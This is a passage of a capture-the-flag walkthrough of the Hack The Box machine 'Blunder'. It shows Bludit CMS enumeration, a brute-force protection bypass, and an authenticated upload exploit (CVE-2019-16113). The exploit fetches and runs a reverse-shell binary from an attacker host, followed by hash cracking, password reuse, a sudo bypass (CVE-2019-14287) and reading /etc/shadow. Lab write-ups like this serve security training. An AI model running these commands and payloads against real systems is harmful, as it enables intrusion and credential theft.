:: Progress: [153068/153068] :: Job [1/1] :: 105 req/sec :: Duration: [0:24:07] :: Errors: 0 ::
</code></pre><p>I found the following path and files:</p><ul><li><code>/install.php</code>: <code>Bludit is already installed ;)</code></li><li><code>/admin/</code>: login page where <code>Bludit</code> is also mentioned</li><li><code>/robots.txt</code>: nothing much</li><li><code>/todo.txt</code>: a bunch of hints, see below</li><li><code>/.gitignore</code>: there is maybe a <code>/.git/</code> folder exposed to dump</li></ul><p><code>/todo.txt</code></p><pre tabindex=0><code>-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
</code></pre><p>The website seems to be built with <a href=https://www.bludit.com/>Bludit CMS</a>.
If we trust the todo list, it may be up to date, the FTP is off and we
saw with the <a href=https://nmap.org/>nmap</a> scan that port 21 is closed. Also there must be a user
called fergus that may be the admin.</p><p>It seems the CMS could be exploitable but we don&rsquo;t know the version we have yet.</p><pre tabindex=0><code>$ searchsploit Bludit --id
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  EDB-ID
---------------------------------------------------------------------------------- ---------------------------------
Bludit 3.9.12 - Directory Traversal                                               | 48568
Bludit - Directory Traversal Image File Upload (Metasploit)                       | 47699
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                 | 46060
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre><p>No need to try to bruteforce on the authentication because there is a
<a href=https://docs.bludit.com/en/security/brute-force-protection>brute force protection enabled by default</a>.</p><p>The current version is 3.13.1, so <a href="https://github.com/bludit/bludit/search?q=3.13.1&unscoped_q=3.13.1">I looked in the source code on github</a>
for this version and tried to see if a file is disclosing it.
It seems that some files like <code>bl-plugins/about/metadata.json</code> are leaking
the version.</p><p>So if we look at http://10.10.10.191/bl-plugins/about/metadata.json we obtain
the following response:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;author&#34;</span>: <span style=color:#e6db74>&#34;Bludit&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;email&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;website&#34;</span>: <span style=color:#e6db74>&#34;https://plugins.bludit.com&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;version&#34;</span>: <span style=color:#e6db74>&#34;3.9.2&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;releaseDate&#34;</span>: <span style=color:#e6db74>&#34;2019-06-21&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;license&#34;</span>: <span style=color:#e6db74>&#34;MIT&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;compatible&#34;</span>: <span style=color:#e6db74>&#34;3.9.2&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;notes&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>For example the directory traversal was in 3.9.12 so 3.9.2 must be vulnerable
too.</p><p>So let&rsquo;s try <a href=https://www.exploit-db.com/exploits/48568>EDB-48568</a> now:</p><pre tabindex=0><code>$ searchsploit -p 48568
  Exploit: Bludit 3.9.12 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/48568
     Path: /usr/share/exploitdb/exploits/php/webapps/48568.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

$ cp /usr/share/exploitdb/exploits/php/webapps/48568.py .

$ python 48568.py

ΓòöΓòù Γö¼  Γö¼ Γö¼ΓöîΓö¼ΓöÉΓö¼ΓöîΓö¼ΓöÉ  ΓòöΓòÉΓòùΓòª ΓòªΓòöΓòùΓòö
ΓòáΓò⌐ΓòùΓöé  Γöé Γöé ΓöéΓöéΓöé Γöé   ΓòáΓòÉΓò¥ΓòæΓòæΓòæΓòæΓòæΓòæ
ΓòÜΓòÉΓò¥Γö┤ΓöÇΓöÿΓööΓöÇΓöÿΓöÇΓö┤ΓöÿΓö┤ Γö┤   Γò⌐  ΓòÜΓò⌐Γò¥Γò¥ΓòÜΓò¥

 CVE-2019-16113 CyberVaca

usage: 48568.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND
48568.py: error: the following arguments are required: -u, -user, -pass, -c
</code></pre><p>But it seems it&rsquo;s an authenticated exploit.
The <a href=https://www.metasploit.com/>MSF</a> upload exploit seems to be authenticated too.</p><p>So I searched on internet and found some articles talking about bruteforce
protection bypass:</p><ul><li><a href=https://rastating.github.io/bludit-brute-force-mitigation-bypass/>Bludit Brute Force Mitigation Bypass</a></li><li><a href=https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb>Bludit CMS Version 3.9.2 Brute Force Protection Bypass</a></li></ul><p>With <a href=https://github.com/digininja/CeWL>CeWL</a> let&rsquo;s build a wordlist based on the words from the website:</p><pre tabindex=0><code>$ cewl -w blunder_wordlist.txt -m 5 http://10.10.10.191
</code></pre><p>Then we can try to find <code>fergus</code> password via bruteforce. I made an exploit
for the Brute Force Mitigation Bypass:
<a href=https://github.com/cyfun/Bludit-auth-BF-bypass>Bludit-auth-BF-bypass</a>.</p><pre tabindex=0><code>$ ./exploit.rb -r http://10.10.10.191 -u fergus -w blunder_wordlist.txt
[*] Trying password: Plugins
[*] Trying password: Include
[*] Trying password: About
[*] Trying password: Begin
[*] Trying password: service
[*] Trying password: Stadia
[*] Trying password: Dynamic
[*] Trying password: blunder
[*] Trying password: interesting
[*] Trying password: facts
[*] Trying password: devices
[*] Trying password: Google
...
[*] Trying password: RolandDeschain

[+] Password found: RolandDeschain
</code></pre><p>Now we can log in and will probably be able to use one of the authenticated
exploit.</p><p>Let&rsquo;s try the <a href=https://www.metasploit.com/>msf</a> one:</p><pre tabindex=0><code>msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.98     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2

msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run

[*] Started reverse TCP handler on 192.168.1.98:4444
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading ScDPUYvvNY.png...
[*] Uploading .htaccess...
[*] Executing ScDPUYvvNY.png...
[!] This exploit may require manual cleanup of &#39;.htaccess&#39; on the target
[*] Exploit completed, but no session was created.
</code></pre><p>But remember we can try the Python PoC, that won&rsquo;t drop a shell directly but
we should be able to execute a command:</p><pre tabindex=0><code>$ python 48568.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c &#39;wget http://10.10.14.82:8888&#39;

ΓòöΓòù Γö¼  Γö¼ Γö¼ΓöîΓö¼ΓöÉΓö¼ΓöîΓö¼ΓöÉ  ΓòöΓòÉΓòùΓòª ΓòªΓòöΓòùΓòö
ΓòáΓò⌐ΓòùΓöé  Γöé Γöé ΓöéΓöéΓöé Γöé   ΓòáΓòÉΓò¥ΓòæΓòæΓòæΓòæΓòæΓòæ
ΓòÜΓòÉΓò¥Γö┤ΓöÇΓöÿΓööΓöÇΓöÿΓöÇΓö┤ΓöÿΓö┤ Γö┤   Γò⌐  ΓòÜΓò⌐Γò¥Γò¥ΓòÜΓò¥

 CVE-2019-16113 CyberVaca

[+] csrf_token: c70c85766c4e397c88528a05f2096ec4b155ccb7
[+] cookie: dvn3jo5f1srsl0in6snh59k346
[+] csrf_token: 1c97c7eab1fadc24b5ac09a593e150c794a19eb7
[+] Uploading oytpsybc.jpg
[+] Executing command: wget http://10.10.14.82:8888
[+] Delete: .htaccess
[+] Delete: oytpsybc.jpg
</code></pre><p>We can see the connection on our oneline web server:</p><pre tabindex=0><code>$ ruby -run -e httpd . -p 8888
[2020-08-16 20:54:16] INFO  WEBrick 1.6.0
[2020-08-16 20:54:16] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
[2020-08-16 20:54:16] INFO  WEBrick::HTTPServer#start: pid=71953 port=8888
10.10.10.191 - - [16/Aug/2020:20:54:53 CEST] &#34;GET / HTTP/1.1&#34; 200 2265
- -&gt; /
</code></pre><p>So we can generate a reverse shell with <code>msfvenom</code> (part of <a href=https://www.metasploit.com/>msf</a>):</p><pre tabindex=0><code>$ msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9999 -f elf &gt; revshell.elf
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
</code></pre><p>Start a listener with <a href=https://pwncat.org/>pwncat</a>:</p><pre tabindex=0><code>$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
</code></pre><p>Upload & execute our reverse shell:</p><pre tabindex=0><code>$ python 48568.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c &#39;wget http://10.10.14.82:8888/revshell.elf &amp;&amp; chmod +x revshell.elf &amp;&amp; ./revshell.elf&#39;

ΓòöΓòù Γö¼  Γö¼ Γö¼ΓöîΓö¼ΓöÉΓö¼ΓöîΓö¼ΓöÉ  ΓòöΓòÉΓòùΓòª ΓòªΓòöΓòùΓòö
ΓòáΓò⌐ΓòùΓöé  Γöé Γöé ΓöéΓöéΓöé Γöé   ΓòáΓòÉΓò¥ΓòæΓòæΓòæΓòæΓòæΓòæ
ΓòÜΓòÉΓò¥Γö┤ΓöÇΓöÿΓööΓöÇΓöÿΓöÇΓö┤ΓöÿΓö┤ Γö┤   Γò⌐  ΓòÜΓò⌐Γò¥Γò¥ΓòÜΓò¥

 CVE-2019-16113 CyberVaca

[+] csrf_token: 1f60ba2db4a30cade52205468c95b5f33e408bc3
[+] cookie: 3a679ict7buj7aqkmff6e132f3
[+] csrf_token: 6c3f1bf1c0455dfabb3c539367629f6cb21298da
[+] Uploading ggllqvlr.jpg
[+] Executing command: wget http://10.10.14.82:8888/revshell.elf &amp;&amp; chmod +x revshell.elf &amp;&amp; ./revshell.elf
[+] Delete: .htaccess
[+] Delete: ggllqvlr.jpg
</code></pre><p>And we obtain a shell:</p><pre tabindex=0><code>INFO: Client connected from 10.10.10.191:53416 (family 2/IPv4, TCP)

which python
/usr/bin/python

python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;

www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ uname -a
Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat /etc/os-release
NAME=&#34;Ubuntu&#34;
VERSION=&#34;19.10 (Eoan Ermine)&#34;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&#34;Ubuntu 19.10&#34;
VERSION_ID=&#34;19.10&#34;
HOME_URL=&#34;https://www.ubuntu.com/&#34;
SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
VERSION_CODENAME=eoan
UBUNTU_CODENAME=eoan

www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre><p>Note: it&rsquo;s possible <a href=https://github.com/bludit/bludit/issues/1081>to do it manually</a> too.</p><h2 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h2><p>Let&rsquo;s see if there are accounts used by humans:</p><pre tabindex=0><code>www-data@blunder:/var/www/bludit-3.9.2$ ls -lhA /home
total 8.0K
drwxr-xr-x 16 hugo  hugo  4.0K May 26 09:29 hugo
drwxr-xr-x 16 shaun shaun 4.0K Apr 28 12:13 shaun

www-data@blunder:/var/www/bludit-3.9.2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:107:114::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:108:115:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:110:116:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:113:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
kernoops:x:114:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:116:122::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:117:123:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
whoopsie:x:118:124::/nonexistent:/bin/false
colord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:120:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:121:126::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:122:127:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:123:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:124:129:Gnome Display Manager:/var/lib/gdm3:/bin/false
shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
temp:x:1002:1002:,,,:/home/temp:/bin/bash
</code></pre><p><code>user.txt</code> is in hugo&rsquo;s home folder and shuan maybe be used for pe.</p><h2 id=privilege-escalation-of-machine--from-www-data-to-hugo>Privilege Escalation of Machine : from www-data to hugo<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-www-data-to-hugo>#</a></h2><p>Let&rsquo;s see in the database of the app:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#a6e22e>www</span><span style=color:#f92672>-</span><span style=color:#a6e22e>data</span><span style=color:#f92672>@</span><span style=color:#a6e22e>blunder</span><span style=color:#f92672>:/</span><span style=color:#66d9ef>var</span><span style=color:#f92672>/</span><span style=color:#a6e22e>www</span><span style=color:#f92672>/</span><span style=color:#a6e22e>bludit</span><span style=color:#f92672>-</span><span style=color:#ae81ff>3.9</span><span style=color:#f92672>.</span><span style=color:#ae81ff>2</span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#a6e22e>cat</span> <span style=color:#a6e22e>bl</span><span style=color:#f92672>-</span><span style=color:#a6e22e>content</span><span style=color:#f92672>/</span><span style=color:#a6e22e>databases</span><span style=color:#f92672>/</span><span style=color:#a6e22e>users</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>defined</span>(<span style=color:#e6db74>&#39;BLUDIT&#39;</span>) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Bludit CMS.&#39;</span>); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>{
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &#34;admin&#34;: {
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;nickname&#34;: &#34;Admin&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;firstName&#34;: &#34;Administrator&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;lastName&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;role&#34;: &#34;admin&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;password&#34;: &#34;bfcc887f62e36ea019e3295aafb8a3885966e265&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;salt&#34;: &#34;5dde2887e7aca&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;email&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;registered&#34;: &#34;2019-11-27 07:40:55&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenRemember&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenAuth&#34;: &#34;b380cb62057e9da47afce66b4615107d&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenAuthTTL&#34;: &#34;2009-03-15 14:00&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;twitter&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;facebook&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;instagram&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;codepen&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;linkedin&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;github&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;gitlab&#34;: &#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    },
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &#34;fergus&#34;: {
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;firstName&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;lastName&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;nickname&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;description&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;role&#34;: &#34;author&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;password&#34;: &#34;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;salt&#34;: &#34;jqxpjfnv&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;email&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;registered&#34;: &#34;2019-11-27 13:26:44&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenRemember&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenAuth&#34;: &#34;0e8011811356c0c5bd2211cba8c50471&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenAuthTTL&#34;: &#34;2009-03-15 14:00&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;twitter&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;facebook&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;codepen&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;instagram&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;github&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;gitlab&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;linkedin&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;mastodon&#34;: &#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    }
</span></span></span></code></pre></div><p>The password seems to be stored as a salted SHA1 hash, we can tell with
:</p><pre tabindex=0><code>$ haiti bfcc887f62e36ea019e3295aafb8a3885966e265
SHA-1 [HC: 100] [JtR: raw-sha1]
Double SHA-1 [HC: 4500]
RIPEMD-160 [HC: 6000] [JtR: ripemd-160]
Haval-160
Tiger-160
HAS-160
LinkedIn [HC: 190] [JtR: raw-sha1-linkedin]
Skein-256(160)
Skein-512(160)
</code></pre><p>Those two users won&rsquo;t help us because admin doesn&rsquo;t have a system account &
we already have fergus that doesn&rsquo;t have a system account too.</p><p>But look, there is another bludit version:</p><pre tabindex=0><code>www-data@blunder:/var/www$ ls
bludit-3.10.0a  bludit-3.9.2  html
</code></pre><p>In the other version the user database contains hugo, a user that is on the
system, so we have soem chance the account re-use the same password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>www</span><span style=color:#f92672>-</span><span style=color:#a6e22e>data</span><span style=color:#f92672>@</span><span style=color:#a6e22e>blunder</span><span style=color:#f92672>:/</span><span style=color:#66d9ef>var</span><span style=color:#f92672>/</span><span style=color:#a6e22e>www</span><span style=color:#f92672>/</span><span style=color:#a6e22e>bludit</span><span style=color:#f92672>-</span><span style=color:#ae81ff>3.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span><span style=color:#a6e22e>a</span><span style=color:#f92672>/</span><span style=color:#a6e22e>bl</span><span style=color:#f92672>-</span><span style=color:#a6e22e>content</span><span style=color:#f92672>/</span><span style=color:#a6e22e>databases</span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#a6e22e>cat</span> <span style=color:#a6e22e>users</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>defined</span>(<span style=color:#e6db74>&#39;BLUDIT&#39;</span>) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Bludit CMS.&#39;</span>); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>{
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &#34;admin&#34;: {
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;nickname&#34;: &#34;Hugo&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;firstName&#34;: &#34;Hugo&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;lastName&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;role&#34;: &#34;User&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;password&#34;: &#34;faca404fd5c0a31cf1897b823c695c85cffeb98d&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;email&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;registered&#34;: &#34;2019-11-27 07:40:55&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenRemember&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenAuth&#34;: &#34;b380cb62057e9da47afce66b4615107d&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;tokenAuthTTL&#34;: &#34;2009-03-15 14:00&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;twitter&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;facebook&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;instagram&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;codepen&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;linkedin&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;github&#34;: &#34;&#34;,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &#34;gitlab&#34;: &#34;&#34;}
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}
</span></span></span></code></pre></div><p>And this time no salt it used. So let&rsquo;s try the hash on
<a href=https://crackstation.net/>CrackStation</a>.</p><p>The password is: <code>Password120</code>.</p><pre tabindex=0><code>www-data@blunder:/var/www$ su hugo
Password:

hugo@blunder:~$ cat user.txt
9b8099236a4c7efcad6bf60293d921e5

hugo@blunder:~$ id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
</code></pre><h2 id=privilege-escalation-of-machine--from-hugo-to-root>Privilege Escalation of Machine : from hugo to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-hugo-to-root>#</a></h2><p>We can launch a bash shell as any user except root:</p><pre tabindex=0><code>hugo@blunder:~$ sudo -l
Password:

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
</code></pre><p>But that&rsquo;s in theory, because we can use <code>sudo &lt; 1.8.28 - Security Bypass</code>
(CVE-2019-14287), see <a href=https://www.exploit-db.com/exploits/47502>EDB-47502</a>.</p><pre tabindex=0><code>hugo@blunder:~$ sudo --version
sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1

hugo@blunder:~$ sudo -u#-1 /bin/bash

root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)

root@blunder:/# cat /root/root.txt
df815831c59461a89906cac16c662282

root@blunder:/# cat /etc/shadow | grep root
root:$6$GmdDkez55tk.8Dvd$qDfa.WwHrKSBCswEaWLaSwFNCeNroew0pyxbsg8uO8a2/uq.XelP9Q/u5Cb9cBxO6hSyaVqt1lfU.3omw0ThC0:18228:0:99999:7:::
